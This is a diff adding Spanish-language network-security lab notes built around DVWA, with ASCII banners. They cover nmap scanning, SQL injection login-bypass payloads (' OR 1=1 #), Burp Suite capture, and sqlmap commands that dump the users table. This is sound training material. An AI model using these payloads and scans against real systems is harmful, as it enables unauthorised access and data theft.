@@ -1,0 +1,891 @@
+      _____ ______ _____ _    _ _____  _____ _____          _____    ______ _   _   _____  ______ _____  ______  _____ 
+     / ____|  ____/ ____| |  | |  __ \|_   _|  __ \   /\   |  __ \  |  ____| \ | | |  __ \|  ____|  __ \|  ____|/ ____|
+    | (___ | |__ | |  __| |  | | |__) | | | | |  | | /  \  | |  | | | |__  |  \| | | |__) | |__  | |  | | |__  | (___  
+     \___ \|  __|| | |_ | |  | |  _  /  | | | |  | |/ /\ \ | |  | | |  __| | . ` | |  _  /|  __| | |  | |  __|  \___ \ 
+     ____) | |___| |__| | |__| | | \ \ _| |_| |__| / ____ \| |__| | | |____| |\  | | | \ \| |____| |__| | |____ ____) |
+    |_____/|______\_____|\____/|_|  \_\_____|_____/_/    \_\_____/  |______|_| \_| |_|  \_\______|_____/|______|_____/ 
+
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,,,,,,,,,;;,,,,,,,,,,;;;;;;,,,,,,;;,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;:clodxkO00K000Okkxoc;,;,,;;,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;;;::ccccllllllllllcccccccccodxk0KNWWWWWX0xc,,;,;;,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;:::cclllooodddxkkOOOOOOOkxxdolc:;;;cdkKNWWWWXx:,,;,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;,,,;;;,,,,,,,;;;::clodxkO00000Okxdlc;,:okXWMMW0l;,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;,,,,,,,:cllcc:;,,,,,,,,;;;,,,,,;;cldxkOOOOOOOkdl;,:xKWWW0c,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;,,;coddool:,,,,,,,,,,,,,,,,,,,,,,,,;;:lxOOOOOOOOxo:,:kNWNx;,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,,;;,,;::cdkOkxl:,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,;:okO0OOOOOko;,oKW0:,;;
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,,;cdkKKKOdc;,,,;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:okO0OOO0Ox:,lKXl,;;
+,,;;;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,,,,;;,,,:lx0XXOdl:;,;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;;,,,,:xOOO0OOOxc,d0l,;;
+,,,,,,,;;,,;,,,,;;;,,,,,,,,,,,,,,,,,;;,,,,,,,,,,,,,,;ckNN0xc;,,,,,,,;,,,,,;,,,,;,,;,,,,,,,,,,,;,,,;,,;;;;;,,,;oOOOO0O0d;:oc,;,
+;lxkkOO00OOOkkxoc;,,,;;lkOOOkxc,;;,,;,,cxOkOOxclkkOkOxoxo;,;dkkkOkkd;,,;,ckkkkOd;,,;dkkkkOkxc;;,,,,,,,,,,,,,,,:dOOOOO0kl;:;,,,
+;kMMMMMMMMMMMMMWN0xl;;,cKMMMMWx;;;,,;,;kWWWMWO:lXMMMMXo,,,,lKMMMMMMKl,,,;xWMWMWx;,,oXMMWMWWWO:,;;,,;,,,,,,,;,,,ck0O0O0Oo,,;,,,
+;kMMMMWXKKKXNWMWWMWNOl;,dNMMWMXl,;;,,,lXMMMMKxOkOWMMMWk;,,;dNMMMMMMWx,,,c0MMMMKl,;:OWMMWMMMMNo;;,,,;,,,,,,,,,;,;dOO0O0Oo;;;,,,
+;kMMMMWx;;;;:okXMMMMWKl,:OWMWWWk;,;,,:OWWWMNkOW0xKMMMM0c,,:OWMMMMMMM0:,;oNMWMWx;,,dNWMMXXMMMM0:,;,,;,,,,,,,,,,,;oOOOOOOl,,,,,,
+;kMMMMWx;,,,;;,lKWMMMWO:,oXMWMMXl,;,,dNMMMWOkXWXdOMMMMNo,,oXMMMWWMMMXl,:kWMMWKl,;c0MMMNxdNMMMNx;,,,;,,,,,,,,,;,;oO0OOOx:,;,,,,
+;kMMMMWx;,;;,,;,oNMMWMXo,;kWMMWWO:,,:0MMMMXx0MXd;oNWMMWk;;kWMWMXKWMMWx,cKMMMWk;,;xWMMMKc:0MWWMKc,,,;,,,,,,,,,;,;d0OOOOo;;;;;,,
+;kMMMMWx;,;,,;;,cKMWWMNd,,cKWMMMXo,,dNMMMWOkWXo;,:0MMMM0:cKMMWWkdXMMW0:oNMMMXl,,cKWMMNx;,dNMWMWx;,,,,,,,,,,,,,,ck0OOOdcol,,;,,
+;kMMMMWx;;;,;,;,lXMWMMNd,,;dNMMMWO;c0MMMM0kXXo;,;;dNMWMNodNWMNKocKMMMXokWWMWk;,;kWWMMXdlcoKMMMMXo;;,,,,,,,,;,,;dOOOOdcx0c,;;,,
+;kMMMMWx;;,,,;,,dNWMMMKl,;,:OWMMMXodNMWWNk0Nx;,,,,cKWWMWOOWMM0d:;kWMMNOKMMMXl,,lXMMMMWNNNNWMMMMWO:,;,,,,,,,;,;lkO0OdcxNk;,;,,,
+;kMMMMWx;;;;,,;oXMMMMNx;,;;,oXMMMW0KMMWWOkN0:,;,,,;kWMMMNNWMWx;;,oXMMWNWMMWk;,:OMMWMWWMMMMWMMMMMNd,,,,,,,,,,;lkOOOolONNo,,,;,,
+;kMMMMWx;;;;coONWWMWNO:,;;,,:kWMMMWWMMMKxKNd,,,,;;,lXMMMMMMMXl',,c0MMMMMMMXo,,dNMWWM0ddddddOWMMMM0c,,,,,,,,;lkOOxloKWW0c,,,,,,
+;kMMMMWX000KNWMWWWWXd:;,,;,,,lKMWMMMMMNkOWXl,;;,,,,;kWMMMMMWO:,,,;xWMWMMMWO:,:0MMMMNo,,,,;,cKMMMMWx;,;,,;,;oO0kolkNMMNd;;,;,,,
+;kMMMMMMMMMMWWMWXOd:,;;,;;,,,;dNMMWMMW0kXMXl,,,,;;;,oNMMMWMNo,,;;,lXMWMMMXo,;dNMMMMO:,;;,;,,xNMMMWKl,;:;,:dOOdcdKWWMWk:,,,;,,,
+;oO00KKKK000Okdoc;,,,;,,;;,,,,:dOOO00OxKWWWx;;,,;;;;:x0OOOOx:,;;,,:dOOO0Od:,:dOOOOkl,;;;,,,,:xOOOOOo:::;lkOdco0NMMWW0c,,,;,,,,
+;;;;;;;;;;;;;;;;,,,,,;;;,,,;,,;,;;cxo:dXWWMXo;,,;,,;,;,,,;;;,;;,,;;;;;;;;,,;,,;;;;,,,;,,;;,,,,;,;col:;cxxoclONWWMWW0c,;,;,,;,,
+;,,,,,,,,,,,;;;;,,,,;,,,,,;,;,,;,,:xOo:l0WMWXkc,,,;,,;;,,,;;;;,,,,,;;,;;;;,,,,;;,;,;;,,,,,,,,,:odo:;codlclONMWWMWWO:,;;,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;oOOd:;o0XWWKxl;,,;;;,,;;;,,;;;,,,;,,,,,,,,,;;,,,,,;;;,,;cldxo:;:llc:oONWMMMWWXd;,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:xOOxc,;cdOXNN0xl:;,,,;;;;,,,,,;;,,,,,,,;;,,,;;,,,,,;coxkxl:;:c:;cd0NMWWMMMNOl;,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cxOOkdc;,;codOKKK0kdlc;;;,,,,,;,,,,,,,,,,,;,,;;;cldkOxoc;,;;;;lkXWMMMWWWN0o;,;;,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,cxO0OOxl:;,,,;:ldxkOkxxxddoolc::;;,,,,,,;;:loxkOOxoc;,,,,;cx0NWMMMMMWXOo;,;,;;,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:oO0O0Okxol:;,,,,,,;;:cllllllcc:::::clodkOOOkxoc;,,,;:ld0NWWWWMMWXOdc;,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,;cdkOOOO0OkxdoolllccccccccllloddxkkO00Okdol:;,,,;cokKNWWWWWWN0ko:;,,;,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,;;:ldkO00OOO00OOOOOOOOOOOOOOO00OOkxdlc;;,,;:ldk0XWMMWWX0Oxoc;,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,,;,,,;:coddxkOOOOOO00OOOOkkxxdoolc:;:lodxkO0KXNXXK0kxdl:;,,,,;;,,,;,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;::cccclllcccc::;;,,,,,;;:clooddoolcc:;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,,,;,,,;;,,,,,;;,,,;;,,,,,;;;,,,,,,,,;;,,;;;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,;;;,,;;;;;,,;;,,,,,,,,;;;,,,,,,,,;;;;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;;,,,,,,,,;;;;;;;;,,,,,,,,,,,,,,;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kxONNNNXklxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWWMMMM
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXx:;oXNNN0l;dXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWWMM
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXk:'lOKNNKd,'dXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWW
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0l'.lKNNXk;.'dXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNW
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKd,..lKXXOc..'xXNNNNNNNKKNNNNNNNXKKXNNNNNNNNNNNNNNNNNNNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKx;..'dKOl;'..;kNNNNNXOd:;xNNNKOdl:;dXNNNNNNNNNNNNNNNNNNNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXk:...;xOl'....:0NNXKkl;...'oxo:,....;OXXXKK00OkOXNNNNNNNNNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXk:....cdl'.....ckOxo:'................'::;,,''..;kXNNNNNNNNNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOc....,cc'.......''..............................cONNNNNNNNNNNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXkc......''.........................................,:clodxkO0KXNNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNKd;............................................................,lkKNNNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNNNXOo,.............................................................;lddxOXNNNNNN
+         NNNNNNNNNNNNNNNNNNNNNNNNXkc'............................';cldxxkkkkkxxxdol:,...............':loddk0XNNNN
+         NNNNNNNNNNNNNNNNNNNNNNXk:...........................;cdkKXNNNNNNNNNNNNNNNNXKOdc'..............';loxkKNNN
+         NNNNNNNNNNNNNNNNNNNNNOc........................'codOXNNNNNNNNNNNNNNNNNNNNNNNNNN0d;...............':oxOXN
+         NNNNNNNNNNNNNNNNNNNXd'......................'cxKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKo'...........;:cldxxk0
+         NNNNNNNNNNNNNNNNNNKl.....cc...............,oOXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXx'..........;oxxxxxxx
+         NNNNNNNNNNNNNNNNN0c....,dx:.............,d0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNd...........'ldxxxxx
+         NNNNNNNNNNNNNNNNO;....;l:.............'l0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0:............;oxxxx
+         NNNNNNNNNNNNNNXd,.....'..............:kNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXl.............,lxxx
+         NNNNNNNNNNNNXk:....................'oKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXl.........'::::ldxx
+         NNNNNNNNNNNNKkl'.................,l0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0:.........'oxxxxxxx
+         NNNNNNNNNNNNNXd'..............'cxKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXl...........:xxxxxkk
+         NNNNNNNNNNNN0l.............'cd0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKo............'oxxkkkk
+         NNNNNNNNNNKd,...........'cx0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0c..............:xkkkkk
+         NNNNNNNX0o,..........':x0NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKd,..........;ool:cxkkkkk
+         NNNNXOd:'..........'lOXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKx;............lxkkkxkkkkkk
+         NNNXo.............:ONNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKd;.............:xkkkkkkkkkkk
+         NNNNd...........'dKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXkl,..........',..'okkkkkkkkkkkk
+         NNNNXo'........'dXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKOo;...........;lxxo:lxkkkkkkkkkkkk
+         NNNNNXk:.......cKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkl;...........,cdxkkkkkkkkkkkkkkkkkOO
+         NNNNNNNXkc'....cKNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkdc,..........';coxkkkkkkkkkkkkkkkkkOOOOO
+         NNNNNNNNNN0xl:',xXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNX0koc,...........,:ldxkkkkkkkkkkkkkkkkkkOOOOOOO
+         NNNNNNNNNNNNNXKO0XNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKOxl:'...........,:ldxkkkkkkkkkkkkkkkkkkkOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNK0Odc,...........',:ldxkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN0xl,'...........,:codxkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKxc'..........,;cldxxxkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXOl,........',:ldxxxxkxxkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKx:.......,:cldxxxxxxxkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXx;.....';coxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOO
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNO:.....;cdxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOO00
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNXd'...':oxxxxxxxkkkxkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKo...'cdxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOO0O000000
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKo...:dxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOO0O000000000
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNXd..'lxxxxxxkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOO0000000000000
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNO;.,oxxxxkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000000000000KX
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNx''oxxkkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOO0000000000000000XWM
+         NNNNNNNNNNNNNNNNNNNNNNNNNNNNNx,cxkkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOO0000000000000000XNMMM
+         WNNNNNNNNNNNNNNNNNNNNNNNNNNNNxcdkkkkkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000000000000XNWMMMM
+
+
+Parte 1 
+	Escaneo de nmap
+
+MWXOxdddddddONMN0kxdddddddxkxddddddx0WMMMMXkddddddxk0KKOxddddddddddd0WMMMMMN0xddddddddddddxkOKNWMMMMMM
+WO:,,;:;;:;',okl,,;;;;::;;,',;;;;;,':0WMMXo'';:;;;;,,,,,;:;;:;;;:;,.;OWMMWOc,,;:;;;;;;;;;;;,,,:oONMMMM
+Kc.:x00000Od;''.,oO0000000xox00000kc':0WNo''lO00000d;.'lO000000000d;.:0MMXc.;x0000000000000Oxoc,,cOWMM
+Xl';oxk0KKK0x:'.'cdxk0KK0kocok0KKKKk:'cOd,'cOKKKK0kl,.':dxxk0KKKKK0d,'lKMXo',lxk0KK0kxxxxkkO0K0x:';kWM
+MXd:''cO00000kc'..'':k00x;...cO00000x:',''ck00000k:.;lc:,',lO00kk00Ol''oXMXx:'':k00x:',;;,,;oO00k:.cKM
+MMW0:.:k00OO00Oo,...:k00x;...cO00OO00d;..:x00OO00k:'oKXO:.:x00x::x00kc',dNMWKc.:k00x;.;lol;.,d00Oc.:0M
+MMMKc.:k00xcdO0Od;..:x00x;...cO0Odok0Od;;xO0kox00k:'oKKo';dO0kc'.:xO0x:',kWMXl.:k00x;'',,,,;lk0Ox;'lXM
+MMMKc.:kOOd,,lkOOx:';xOOd;...ckOOo;lkOOxxOOkc;dOOx:'lko,,oOOko;,,,lkOOd;.;OWXl.:xOOOxdddxxxkOOkd;':0WM
+MMMKc.:xOOd,.':xOOklcxOOd,...ckOOo''lkOOOOkl',dOOx;.',''lkOOkkxxxxxkOOOo,.:0Xl.;xOOOkkkkkkkxdl:,,lKWMM
+MMMKc.:xOko,..';okOkxkOOd,...ckOko'.,lkkkkl,.,dkkx;...'cxkkkxxxxxxxxkkOkl,'lkc.;xkOxc;;;;;,,,,:o0NMMMM
+MWKo,.:xkko,....,lxkkkkkd,...:xkko,..,:cc:,..,okkd;.'':dkkd:,,,,,,,,:dkkxc'','.;dkkd;......,o0NWMMMMMM
+MKc',coxkkxolc;..':dkkkko,.;coxkkdolc,....;cloxkkxollodkkkdlc;'...;cldkkkxoc:cloxkkxollllc,':0MMMMMMMM
+MO;':dxxxxxxxdc'.'';oxxxo,'cdxxxxxxxd:'..'cdxxxxxxxxxxxxxxxxxc'..'cdxxxxxxxdodxxxxxxxxxxxd:',kMMMMMMMM
+MNx;',;;;;;;;,',oxc',;;;,'.',;;;;;;;,,:oc,',;;;;;;;;;;;;;;;;;'':l;,,;;;;;;;;,,;;;;;;;;;;;,';dXMMMMMMMM
+MMWKkxddddddddkKWWXkddddddddddddddddxOXWN0xddddddddddddddddddx0NWKkxdddoddddxxddddddddddddkKWMMMMMMMMM
+
+Escaneo de un Rango de IPs:
+nmap 192.168.1.1-254
+
+Escaneo de una Red Completa:
+nmap 192.168.1.0/24
+
+Escaneo de un Rango de IPs:
+nmap 192.168.1.1-254
+
+Escaneo de Puertos Específicos:
+nmap -p <puertos> <dirección_IP>
+
+Detección de Sistema Operativo:
+sudo nmap -O <dirección_IP>
+
+Detección de Servicios y Versiones:
+nmap -sV <dirección_IP>
+
+Escaneo de Red Completa y Detección de SO y Servicios:
+sudo nmap -O -sV 192.168.1.0/24
+
+Escaneo Stealth (SYN Scan):
+sudo nmap -sS <dirección_IP>
+
+Escaneo UDP:
+sudo nmap -sU <dirección_IP>
+
+Formato Normal:
+
+nmap -oN resultados.txt <dirección_IP>
+
+Formato XML:
+nmap -oX resultados.xml <dirección_IP>
+
+Formato de Script para Parseo:
+nmap -oG resultados.gnmap <dirección_IP>
+
+omitir host sin respuesta
+sudo nmap -A -p- 192.168.1.0/24 -Pn
+
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+
+ __  __        _____  ____  _      
+|  \/  |      / ____|/ __ \| |     
+| \  / |_   _| (___ | |  | | |     
+| |\/| | | | |\___ \| |  | | |     
+| |  | | |_| |____) | |__| | |____ 
+|_|  |_|\__, |_____/ \___\_\______|
+         __/ |                     
+        |___/                      
+
+Parte 1:
+  Insetar usuarios
+
+=======================================================================================================
+
+sudo mysql -u tu_usuario -p
+USE dvwa;
+SELECT * FROM users;
+DESCRIBE nombre_de_la_tabla;
+
+INSERT INTO users (user_id, first_name, last_name, user, password, avatar, last_login, failed_login) VALUES (6, 'Leonardo', 'David', 'thx1', MD5('23234'), '/DVWA/hackable/users/pablo.jpg', NOW(), 0);
+
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+=======================================================================================================
+
+  _____  ____  _        _____       _           _   _             
+ / ____|/ __ \| |      |_   _|     (_)         | | (_)            
+| (___ | |  | | |        | |  _ __  _  ___  ___| |_ _  ___  _ __  
+ \___ \| |  | | |        | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
+ ____) | |__| | |____   _| |_| | | | |  __/ (__| |_| | (_) | | | |
+|_____/ \___\_\______| |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
+                                  _/ |                            
+                                 |__/       
+
+=======================================================================================================
+
+SQL Injection es una vulnerabilidad de seguridad que ocurre cuando
+un atacante inserta código SQL malicioso en una entrada de datos de una 
+aplicación web, aprovechando la falta de validación o sanitización adecuada. 
+Este código SQL inyectado puede manipular la base de datos subyacente de la 
+aplicación y realizar acciones no autorizadas, como extraer información 
+confidencial, modificar datos o incluso eliminar la base de datos por completo.
+
+Parte 1:
+	Command Execution
+
+NIVEL-SEGURIDAD: LOW
+
+=======================================================================================================
+
+Commandos 
+
+Para la prueba más baja de SQL Injection, empieza con el siguiente comando:
+
+' OR 1=1 #
+
+### Explicación del Comando:
+- **'**: Termina la cadena de entrada.
+- **OR 1=1**: Una condición que siempre es verdadera.
+- **#**: Comenta el resto de la consulta, ignorando el código SQL que sigue.
+
+### Ejemplo de Uso:
+Supongamos que tienes un formulario de inicio de sesión con los siguientes campos: nombre de usuario y contraseña. En lugar de ingresar valores legítimos, introduce el comando en el campo de nombre de usuario:
+
+- **Nombre de usuario**: `' OR 1=1 #`
+- **Contraseña**: (dejas este campo vacío o ingresas cualquier valor)
+
+### Resultado Esperado:
+Si la aplicación es vulnerable, el comando `' OR 1=1 #` hará que la consulta SQL original se modifique para siempre ser verdadera, permitiendo el acceso sin una contraseña válida.
+
+Para la prueba más baja de SQL Injection, empieza con el siguiente comando:
+
+1' OR 1=1 #
+
+### Explicación del Comando:
+- **1'**: El número `1` seguido por una comilla simple termina la cadena de entrada.
+- **OR 1=1**: Una condición que siempre es verdadera.
+- **#**: Comenta el resto de la consulta, ignorando el código SQL que sigue.
+
+### Ejemplo de Uso:
+Supongamos que tienes un formulario de inicio de sesión con los siguientes campos: nombre de usuario y contraseña. En lugar de ingresar valores legítimos, introduce el comando en el campo de nombre de usuario:
+
+- **Nombre de usuario**: `1' OR 1=1 #`
+- **Contraseña**: (dejas este campo vacío o ingresas cualquier valor)
+
+### Resultado Esperado:
+Si la aplicación es vulnerable, el comando `1' OR 1=1 #` hará que la consulta SQL original se modifique para siempre ser verdadera, permitiendo el acceso sin una contraseña válida.
+
+ ____                             _ _       
+|  _ \                           (_) |      
+| |_) |_   _ _ __ _ __  ___ _   _ _| |_ ___ 
+|  _ <| | | | '__| '_ \/ __| | | | | __/ _ \
+| |_) | |_| | |  | |_) \__ \ |_| | | ||  __/
+|____/ \__,_|_|  | .__/|___/\__,_|_|\__\___|
+                 | |                        
+                 |_|                        
+
+### Paso a Paso: Capturar la Solicitud HTTP con Burp Suite
+
+1. **Configurar Burp Suite**:
+   - Abre Burp Suite y asegúrate de que tu navegador esté configurado para utilizar el proxy de Burp Suite.
+   - En Burp Suite, asegúrate de que el proxy está interceptando las solicitudes (Proxy > Intercept > Intercept is on).
+
+2. **Navegar a DVWA y Generar la Solicitud**:
+   - Ve a DVWA y navega a la sección de "SQL Injection".
+   - Ingresa un ID de usuario o cualquier dato en el campo de entrada y haz clic en "Submit" para enviar la solicitud.
+
+3. **Capturar la Solicitud HTTP**:
+   - En Burp Suite, en la pestaña "Proxy", deberías ver la solicitud HTTP interceptada.
+   - Revisa la solicitud para asegurarte de que es la correcta (debería ser una solicitud POST o GET dependiendo de cómo DVWA maneja la entrada).
+   - Haz clic en "Action" y luego selecciona "Send to Repeater" para analizar la solicitud más a fondo.
+
+4. **Guardar la Solicitud HTTP**:
+   - En la pestaña "Repeater", verás la solicitud que enviaste.
+   - Haz clic derecho en la solicitud y selecciona "Save item".
+   - Guarda la solicitud en un archivo, por ejemplo, `req2.txt`.
+
+           _                       
+          | |                      
+ ___  __ _| |_ __ ___   __ _ _ __  
+/ __|/ _` | | '_ ` _ \ / _` | '_ \ 
+\__ \ (_| | | | | | | | (_| | |_) |
+|___/\__, |_|_| |_| |_|\__,_| .__/ 
+        | |                 | |    
+        |_|                 |_|    
+
+### Uso de sqlmap con la Solicitud HTTP Guardada
+
+### Comandos de sqlmap y su Explicación
+
+#### 1. Obtener Bases de Datos
+**Comando**: `sqlmap -r req2.txt --dbs`
+
+**Descripción**:
+Este comando se usa para enumerar todas las bases de datos disponibles en el servidor de la base de datos. 
+
+- **-r req2.txt**: Especifica que sqlmap debe leer la solicitud HTTP desde el archivo `req2.txt`.
+- **--dbs**: Indica a sqlmap que enumere todas las bases de datos en el servidor.
+
+#### 2. Obtener Tablas de una Base de Datos
+**Comando**: `sqlmap -r req2.txt -D dvwa --tables`
+
+**Descripción**:
+Este comando se usa para enumerar todas las tablas dentro de una base de datos específica.
+
+- **-r req2.txt**: Especifica que sqlmap debe leer la solicitud HTTP desde el archivo `req2.txt`.
+- **-D dvwa**: Indica a sqlmap que se enfoque en la base de datos llamada `dvwa`.
+- **--tables**: Solicita a sqlmap que enumere todas las tablas en la base de datos especificada.
+
+#### 3. Obtener y Volcar Datos de una Tabla
+**Comando**: `sqlmap -r req2.txt -D dvwa -T users --dump-all`
+
+**Descripción**:
+Este comando se usa para volcar todos los datos de una tabla específica dentro de una base de datos.
+
+- **-r req2.txt**: Especifica que sqlmap debe leer la solicitud HTTP desde el archivo `req2.txt`.
+- **-D dvwa**: Indica a sqlmap que se enfoque en la base de datos llamada `dvwa`.
+- **-T users**: Especifica la tabla `users` dentro de la base de datos `dvwa`.
+- **--dump-all**: Indica a sqlmap que vuelque todos los datos contenidos en la tabla especificada.
+
+=======================================================================================================
+  _____  ____  _        _____       _           _   _             
+ / ____|/ __ \| |      |_   _|     (_)         | | (_)            
+| (___ | |  | | |        | |  _ __  _  ___  ___| |_ _  ___  _ __  
+ \___ \| |  | | |        | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
